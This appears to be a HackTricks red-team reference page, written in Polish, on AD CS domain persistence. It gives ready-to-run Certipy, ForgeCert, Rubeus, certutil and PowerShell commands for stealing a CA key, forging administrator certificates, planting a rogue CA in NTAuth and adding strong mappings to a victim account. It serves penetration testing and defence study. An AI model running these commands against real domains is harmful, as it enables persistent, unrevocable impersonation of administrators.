# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**To jest streszczenie technik trwałości w domenie przedstawionych w [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Zapoznaj się z nim, aby uzyskać dalsze szczegóły.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnione są następujące warunki:

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny zabezpieczony przez DPAPI maszyny lub przez sprzęt taki jak TPM/HSM, jeśli system operacyjny to obsługuje.
- Pola Issuer i Subject certyfikatu odpowiadają wyróżnionej nazwie (distinguished name) CA.
- Rozszerzenie "CA Version" występuje wyłącznie w certyfikatach CA.
- Certyfikat nie zawiera pól Extended Key Usage (EKU).

Aby wyodrębnić klucz prywatny tego certyfikatu, obsługiwanym sposobem jest użycie narzędzia `certsrv.msc` na serwerze CA za pomocą wbudowanego GUI. Niemniej jednak ten certyfikat nie różni się od innych przechowywanych w systemie; dlatego do jego wyodrębnienia można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Certyfikat i klucz prywatny można również uzyskać przy użyciu Certipy za pomocą następującego polecenia:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po uzyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx`, narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) można wykorzystać do wygenerowania ważnych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik, którego celem jest fałszowanie certyfikatu, musi być aktywny i zdolny do uwierzytelnienia w Active Directory, aby proces zakończył się powodzeniem. Fałszowanie certyfikatu dla specjalnych kont, takich jak krbtgt, jest nieskuteczne.

Ten sfabrykowany certyfikat będzie **ważny** do określonej daty końcowej oraz tak długo, jak ważny jest certyfikat root CA (zwykle od 5 do **10+ lat**). Jest on również ważny dla **maszyn**, więc w połączeniu z **S4U2Self** atakujący może **utrzymać trwałą obecność na dowolnej maszynie domenowej** tak długo, jak ważny jest certyfikat CA.\
Co więcej, **certyfikaty wygenerowane** tą metodą **nie mogą zostać unieważnione**, ponieważ CA nie jest ich świadome.

### Operating under Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 (po wdrożeniu KB5014754) kontrolery domeny domyślnie przechodzą na **Full Enforcement** dla mapowań certyfikatów. W praktyce oznacza to, że twoje sfałszowane certyfikaty muszą albo:

- Zawierać silne powiązanie z docelowym kontem (np. rozszerzenie bezpieczeństwa SID), lub
- Być sparowane z silnym, jednoznacznym mapowaniem na atrybucie `altSecurityIdentities` obiektu docelowego.

Niezawodnym podejściem do utrzymania persystencji jest wystawienie sfałszowanego certyfikatu dowiązanego do skradzionej Enterprise CA, a następnie dodanie silnego, jawnego mapowania do principala ofiary:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Jeśli uda ci się wykreować sfałszowane certyfikaty, które zawierają SID security extension, będą one mapowane automatycznie nawet przy Full Enforcement. W przeciwnym razie preferuj jawne silne mapowania. Zobacz
[account-persistence](account-persistence.md) aby dowiedzieć się więcej o jawnych mapowaniach.
- Unieważnienie nie pomaga obrońcom: sfałszowane certyfikaty nie figurują w bazie CA i dlatego nie można ich unieważnić.

## Zaufanie do złośliwych certyfikatów CA - DPERSIST2

Obiekt `NTAuthCertificates` jest zdefiniowany tak, aby zawierać jeden lub więcej **certyfikatów CA** w swoim atrybucie `cacertificate`, którego używa Active Directory (AD). Proces weryfikacji przez **kontroler domeny** polega na sprawdzeniu obiektu `NTAuthCertificates` pod kątem wpisu odpowiadającego **CA wskazanej** w polu Issuer uwierzytelniającego **certyfikatu**. Uwierzytelnianie jest kontynuowane, jeśli znaleziono dopasowanie.

Samopodpisany certyfikat CA może zostać dodany do obiektu `NTAuthCertificates` przez atakującego, o ile ma on kontrolę nad tym obiektem AD. Zazwyczaj tylko członkowie grupy **Enterprise Admin**, wraz z **Domain Admins** lub **Administrators** w domenie korzenia lasu, mają uprawnienia do modyfikacji tego obiektu. Mogą oni edytować obiekt `NTAuthCertificates` za pomocą `certutil.exe` poleceniem `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, lub korzystając z [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatkowe przydatne polecenia dla tej techniki:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta możliwość jest szczególnie istotna, gdy jest stosowana wraz z wcześniej opisanym sposobem wykorzystującym ForgeCert do dynamicznego generowania certyfikatów.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Możliwości uzyskania **persistence** poprzez **modyfikacje deskryptorów zabezpieczeń komponentów AD CS** są liczne. Modyfikacje opisane w sekcji "[Domain Escalation](domain-escalation.md)" mogą być złośliwie wdrożone przez atakującego z podwyższonymi uprawnieniami. Obejmuje to dodanie "control rights" (np. WriteOwner/WriteDACL/itd.) do wrażliwych komponentów takich jak:

- Obiekt **komputera AD serwera CA**
- **Serwer RPC/DCOM serwera CA**
- Dowolny **potomek obiekt AD lub kontener** w **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na przykład kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates, itd.)
- **Grupy AD, którym przydzielono prawa do kontrolowania AD CS** domyślnie lub przez organizację (takie jak wbudowana grupa Cert Publishers i jej członkowie)

Przykład złośliwej implementacji obejmowałby atakującego, który ma **elevated permissions** w domenie, dodającego uprawnienie **`WriteOwner`** do domyślnego szablonu certyfikatu **`User`**, przy czym atakujący jest podmiotem tego prawa. Aby to wykorzystać, atakujący najpierw zmieniłby właściciela szablonu **`User`** na siebie. Następnie flaga **`mspki-certificate-name-flag`** zostałaby ustawiona na **1** w szablonie, aby włączyć **`ENROLLEE_SUPPLIES_SUBJECT`**, pozwalając użytkownikowi podać Subject Alternative Name w żądaniu. W konsekwencji atakujący mógłby **enroll** używając **szablonu**, wybierając jako alternatywną nazwę konto **domain administrator**, i użyć pozyskanego certyfikatu do uwierzytelnienia jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować dla długoterminowego persistence (zobacz {{#ref}}domain-escalation.md{{#endref}} po pełne szczegóły i wykrywanie):

- Flagi polityki CA umożliwiające SAN od żądających (np. włączenie `EDITF_ATTRIBUTESUBJECTALTNAME2`). To pozwala nadal wykorzystywać ścieżki podobne do ESC1.
- DACL lub ustawienia szablonu pozwalające na wydawanie certyfikatów zdolnych do uwierzytelniania (np. dodanie EKU Client Authentication, włączenie `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolowanie obiektu `NTAuthCertificates` lub kontenerów CA w celu ciągłego ponownego wprowadzania rogue issuers, jeśli obrońcy podejmą próbę oczyszczenia.

> [!TIP]
> W utwardzonych środowiskach po KB5014754, łączenie tych błędnych konfiguracji z jawnymi, silnymi mapowaniami (`altSecurityIdentities`) zapewnia, że wydane lub sfałszowane certyfikaty pozostaną użyteczne nawet gdy DC wymuszają silne mapowanie.



## References

- Microsoft KB5014754 – Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domen Windows (harmonogram wdrożenia i silne mapowania). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – dokumentacja poleceń i użycie forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
